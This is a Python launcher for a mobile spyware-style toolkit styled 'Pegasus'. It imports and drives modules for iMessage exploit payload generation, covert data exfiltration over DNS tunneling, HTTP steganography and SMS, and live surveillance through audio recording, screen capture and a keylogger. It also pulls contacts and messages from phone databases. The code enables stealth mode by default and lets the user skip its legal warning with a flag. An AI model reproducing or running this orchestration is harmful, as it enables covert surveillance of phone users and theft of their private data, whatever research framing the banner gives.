#!/usr/bin/env python3
"""
Pegasus Launcher
Unified interface for enhanced Pegaspy capabilities
"""

import asyncio
import os
import sys
import json
import argparse
from datetime import datetime
from typing import Dict, List, Optional
import logging

# Import enhanced modules
try:
    from exploits.imessage_advanced import AdvancedIMessageExploit
    IMESSAGE_AVAILABLE = True
except ImportError:
    IMESSAGE_AVAILABLE = False

try:
    from data_exfiltration.exfil_engine import DataExfiltrationEngine
    EXFIL_AVAILABLE = True
except ImportError:
    EXFIL_AVAILABLE = False

try:
    from surveillance.realtime_monitor import RealtimeSurveillanceEngine
    SURVEILLANCE_AVAILABLE = True
except ImportError:
    SURVEILLANCE_AVAILABLE = False

try:
    from testing.pegasus_test_suite import PegasusTestSuite
    TESTING_AVAILABLE = True
except ImportError:
    TESTING_AVAILABLE = False

class PegasusLauncher:
    def __init__(self):
        self.logger = self._setup_logging()
        self.config = self._load_config()
        self.active_sessions = {}
        
    def _setup_logging(self) -> logging.Logger:
        """Setup logging for Pegasus launcher"""
        logger = logging.getLogger('pegasus_launcher')
        logger.setLevel(logging.INFO)
        
        # Create logs directory if it doesn't exist
        os.makedirs('logs', exist_ok=True)
        
        # File handler
        file_handler = logging.FileHandler('logs/pegasus_launcher.log')
        file_handler.setLevel(logging.INFO)
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        
        # Formatter
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)
        
        logger.addHandler(file_handler)
        logger.addHandler(console_handler)
        return logger
    
    def _load_config(self) -> Dict:
        """Load Pegasus configuration"""
        config_file = 'pegasus_config.json'
        
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                self.logger.warning(f"Failed to load config: {e}")
        
        # Default configuration
        return {
            'research_mode': True,
            'authorized_testing_only': True,
            'log_level': 'INFO',
            'max_concurrent_operations': 5,
            'default_target_platform': 'iOS',
            'stealth_mode': True,
            'encryption_enabled': True
        }
    
    def print_banner(self):
        """Print Pegasus banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                         🐎 PEGASUS 🐎                        ║
║              Enhanced Mobile Security Research Platform       ║
║                                                              ║
║  ⚠️  FOR AUTHORIZED SECURITY RESEARCH ONLY ⚠️                ║
║                                                              ║
║  Based on PegaSpy - Advanced Anti-Spyware Framework         ║
║  Enhanced with Pegasus-like capabilities for testing        ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        
        # Show available modules
        print("\n🔧 Available Modules:")
        modules = [
            ("iMessage Exploits", IMESSAGE_AVAILABLE),
            ("Data Exfiltration", EXFIL_AVAILABLE),
            ("Real-time Surveillance", SURVEILLANCE_AVAILABLE),
            ("Test Suite", TESTING_AVAILABLE)
        ]
        
        for module_name, available in modules:
            status = "✅" if available else "❌"
            print(f"   {status} {module_name}")
        
        print("\n" + "=" * 66)
    
    def print_legal_warning(self):
        """Print legal and ethical warnings"""
        warning = """
⚠️  LEGAL AND ETHICAL WARNING ⚠️

This tool is designed for AUTHORIZED SECURITY RESEARCH ONLY.

✅ AUTHORIZED USES:
   • Security research on your own devices
   • Penetration testing with explicit written permission
   • Educational purposes in controlled environments
   • Vulnerability research with responsible disclosure

❌ PROHIBITED USES:
   • Unauthorized access to any device or system
   • Surveillance without explicit consent
   • Any illegal or malicious activities
   • Violation of privacy laws or regulations

📋 REQUIREMENTS:
   • You must have explicit written authorization
   • You must comply with all applicable laws
   • You must respect privacy and data protection
   • You must use this tool ethically and responsibly

By using this tool, you acknowledge that you understand and agree
to these terms and take full responsibility for your actions.
        """
        print(warning)
        
        if not self.config.get('research_mode', False):
            print("\n❌ Research mode is disabled. Exiting.")
            sys.exit(1)
        
        response = input("\nDo you acknowledge and agree to these terms? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("\n❌ Terms not accepted. Exiting.")
            sys.exit(1)
        
        print("\n✅ Terms acknowledged. Proceeding with research mode.")
    
    async def run_exploit_demo(self, target_platform: str = "iOS", ios_version: str = "15.0"):
        """Run exploit generation demo"""
        if not IMESSAGE_AVAILABLE:
            print("❌ iMessage exploit module not available")
            return
        
        print(f"\n🎯 Running exploit demo for {target_platform} {ios_version}")
        print("-" * 50)
        
        try:
            exploit = AdvancedIMessageExploit()
            
            # Generate different exploit types
            exploits = [
                ("CoreGraphics Heap Overflow", exploit.generate_coregraphics_exploit),
                ("ImageIO Integer Overflow", exploit.generate_imageio_exploit),
                ("Notification Use-After-Free", exploit.generate_notification_exploit)
            ]
            
            for exploit_name, exploit_func in exploits:
                print(f"\n🔨 Generating {exploit_name}...")
                payload = exploit_func(target_platform, ios_version)
                
                if payload:
                    print(f"✅ Generated payload: {len(payload)} bytes")
                    print(f"   Payload type: {type(payload).__name__}")
                    print(f"   First 100 chars: {str(payload)[:100]}...")
                else:
                    print(f"❌ Failed to generate {exploit_name}")
        
        except Exception as e:
            print(f"❌ Exploit demo failed: {e}")
            self.logger.error(f"Exploit demo error: {e}")
    
    async def run_surveillance_demo(self, duration: int = 10):
        """Run surveillance demo"""
        if not SURVEILLANCE_AVAILABLE:
            print("❌ Surveillance module not available")
            return
        
        print(f"\n👁️ Running surveillance demo for {duration} seconds")
        print("-" * 50)
        
        try:
            engine = RealtimeSurveillanceEngine()
            
            # Show capabilities
            capabilities = engine.get_capabilities()
            print("\n🔧 Surveillance Capabilities:")
            for capability, available in capabilities.items():
                status = "✅" if available else "❌"
                print(f"   {status} {capability.replace('_', ' ').title()}")
            
            # Start surveillance sessions
            sessions = []
            
            print("\n🎤 Starting audio surveillance...")
            audio_session = await engine.start_audio_surveillance(duration=duration)
            if audio_session:
                sessions.append(audio_session)
                print(f"✅ Audio session: {audio_session}")
            
            print("\n📸 Starting screen capture...")
            screen_session = await engine.start_screen_surveillance(interval=2.0)
            if screen_session:
                sessions.append(screen_session)
                print(f"✅ Screen session: {screen_session}")
            
            print("\n⌨️ Starting keylogger...")
            keylog_session = await engine.start_keylogger_surveillance()
            if keylog_session:
                sessions.append(keylog_session)
                print(f"✅ Keylogger session: {keylog_session}")
            
            # Monitor progress
            print(f"\n⏳ Collecting surveillance data for {duration} seconds...")
            for i in range(duration):
                await asyncio.sleep(1)
                remaining = duration - i - 1
                print(f"\r   Time remaining: {remaining}s", end="", flush=True)
            
            print("\n\n🛑 Stopping all surveillance sessions...")
            stopped = engine.stop_all_surveillance()
            print(f"✅ Stopped {stopped} sessions")
            
            # Show history
            history = engine.get_surveillance_history()
            if history:
                print("\n📈 Surveillance History:")
                for entry in history:
                    print(f"   • {entry['type']} - {entry['start_time']} to {entry['end_time']}")
        
        except Exception as e:
            print(f"❌ Surveillance demo failed: {e}")
            self.logger.error(f"Surveillance demo error: {e}")
    
    async def run_exfiltration_demo(self):
        """Run data exfiltration demo"""
        if not EXFIL_AVAILABLE:
            print("❌ Data exfiltration module not available")
            return
        
        print("\n📤 Running data exfiltration demo")
        print("-" * 50)
        
        try:
            engine = DataExfiltrationEngine()
            
            # Test data
            test_data = b"This is test data for exfiltration demo - " + datetime.now().isoformat().encode()
            
            # Test different exfiltration methods
            methods = [
                ("DNS Tunneling", lambda: engine.exfiltrate_via_dns(test_data, "test.example.com")),
                ("HTTP Steganography", lambda: engine.exfiltrate_via_http_steganography(test_data, "https://httpbin.org/post")),
                ("SMS Covert Channel", lambda: engine.exfiltrate_via_sms_covert(test_data, "+1234567890"))
            ]
            
            for method_name, method_func in methods:
                print(f"\n📡 Testing {method_name}...")
                try:
                    result = await method_func()
                    if result:
                        print(f"✅ {method_name} successful")
                        print(f"   Exfiltrated: {len(test_data)} bytes")
                    else:
                        print(f"❌ {method_name} failed")
                except Exception as e:
                    print(f"❌ {method_name} error: {e}")
            
            # Test database extraction (simulated)
            print("\n💾 Testing database extraction...")
            
            # iOS contacts
            print("   📱 iOS Contacts...")
            ios_contacts = await engine.extract_ios_contacts("/tmp/test_contacts.db")
            if ios_contacts is not None:
                print(f"   ✅ Extracted {len(ios_contacts)} iOS contacts")
            else:
                print("   ❌ iOS contacts extraction failed")
            
            # Android messages
            print("   📱 Android Messages...")
            android_messages = await engine.extract_android_messages("/tmp/test_messages.db")
            if android_messages is not None:
                print(f"   ✅ Extracted {len(android_messages)} Android messages")
            else:
                print("   ❌ Android messages extraction failed")
        
        except Exception as e:
            print(f"❌ Exfiltration demo failed: {e}")
            self.logger.error(f"Exfiltration demo error: {e}")
    
    async def run_full_test_suite(self):
        """Run comprehensive test suite"""
        if not TESTING_AVAILABLE:
            print("❌ Test suite module not available")
            return
        
        print("\n🧪 Running comprehensive test suite")
        print("-" * 50)
        
        try:
            test_suite = PegasusTestSuite()
            await test_suite.run_all_tests()
        
        except Exception as e:
            print(f"❌ Test suite failed: {e}")
            self.logger.error(f"Test suite error: {e}")
    
    async def interactive_mode(self):
        """Run interactive mode"""
        print("\n🎮 Interactive Mode")
        print("-" * 50)
        
        while True:
            print("\n📋 Available Commands:")
            print("   1. Run exploit demo")
            print("   2. Run surveillance demo")
            print("   3. Run exfiltration demo")
            print("   4. Run full test suite")
            print("   5. Show system status")
            print("   6. Exit")
            
            try:
                choice = input("\nSelect option (1-6): ").strip()
                
                if choice == '1':
                    platform = input("Target platform (iOS/Android) [iOS]: ").strip() or "iOS"
                    version = input("Target version [15.0]: ").strip() or "15.0"
                    await self.run_exploit_demo(platform, version)
                
                elif choice == '2':
                    duration = input("Surveillance duration in seconds [10]: ").strip()
                    duration = int(duration) if duration.isdigit() else 10
                    await self.run_surveillance_demo(duration)
                
                elif choice == '3':
                    await self.run_exfiltration_demo()
                
                elif choice == '4':
                    await self.run_full_test_suite()
                
                elif choice == '5':
                    self.show_system_status()
                
                elif choice == '6':
                    print("\n👋 Goodbye!")
                    break
                
                else:
                    print("❌ Invalid option. Please select 1-6.")
            
            except KeyboardInterrupt:
                print("\n\n👋 Goodbye!")
                break
            except Exception as e:
                print(f"❌ Error: {e}")
    
    def show_system_status(self):
        """Show system status"""
        print("\n📊 System Status")
        print("-" * 30)
        
        print(f"🕐 Current Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🐍 Python Version: {sys.version.split()[0]}")
        print(f"📁 Working Directory: {os.getcwd()}")
        print(f"🔧 Research Mode: {'✅' if self.config.get('research_mode') else '❌'}")
        print(f"🔒 Stealth Mode: {'✅' if self.config.get('stealth_mode') else '❌'}")
        print(f"🔐 Encryption: {'✅' if self.config.get('encryption_enabled') else '❌'}")
        
        print("\n📦 Module Status:")
        modules = [
            ("iMessage Exploits", IMESSAGE_AVAILABLE),
            ("Data Exfiltration", EXFIL_AVAILABLE),
            ("Real-time Surveillance", SURVEILLANCE_AVAILABLE),
            ("Test Suite", TESTING_AVAILABLE)
        ]
        
        for module_name, available in modules:
            status = "✅" if available else "❌"
            print(f"   {status} {module_name}")
        
        # Check disk space
        try:
            import shutil
            total, used, free = shutil.disk_usage(".")
            print(f"\n💾 Disk Space:")
            print(f"   Total: {total // (1024**3)} GB")
            print(f"   Used: {used // (1024**3)} GB")
            print(f"   Free: {free // (1024**3)} GB")
        except:
            pass

async def main():
    parser = argparse.ArgumentParser(
        description="Pegasus - Enhanced Mobile Security Research Platform",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python pegasus_launcher.py --interactive
  python pegasus_launcher.py --exploit-demo --platform iOS --version 15.0
  python pegasus_launcher.py --surveillance-demo --duration 30
  python pegasus_launcher.py --test-suite
        """
    )
    
    parser.add_argument('--interactive', action='store_true',
                       help='Run in interactive mode')
    parser.add_argument('--exploit-demo', action='store_true',
                       help='Run exploit generation demo')
    parser.add_argument('--surveillance-demo', action='store_true',
                       help='Run surveillance demo')
    parser.add_argument('--exfiltration-demo', action='store_true',
                       help='Run data exfiltration demo')
    parser.add_argument('--test-suite', action='store_true',
                       help='Run comprehensive test suite')
    parser.add_argument('--platform', default='iOS',
                       help='Target platform for exploit demo (default: iOS)')
    parser.add_argument('--version', default='15.0',
                       help='Target version for exploit demo (default: 15.0)')
    parser.add_argument('--duration', type=int, default=10,
                       help='Surveillance duration in seconds (default: 10)')
    parser.add_argument('--skip-warning', action='store_true',
                       help='Skip legal warning (for automated testing)')
    
    args = parser.parse_args()
    
    launcher = PegasusLauncher()
    launcher.print_banner()
    
    # Show legal warning unless skipped
    if not args.skip_warning:
        launcher.print_legal_warning()
    
    # Execute based on arguments
    if args.interactive:
        await launcher.interactive_mode()
    elif args.exploit_demo:
        await launcher.run_exploit_demo(args.platform, args.version)
    elif args.surveillance_demo:
        await launcher.run_surveillance_demo(args.duration)
    elif args.exfiltration_demo:
        await launcher.run_exfiltration_demo()
    elif args.test_suite:
        await launcher.run_full_test_suite()
    else:
        # Default to interactive mode
        await launcher.interactive_mode()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n👋 Goodbye!")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        sys.exit(1)
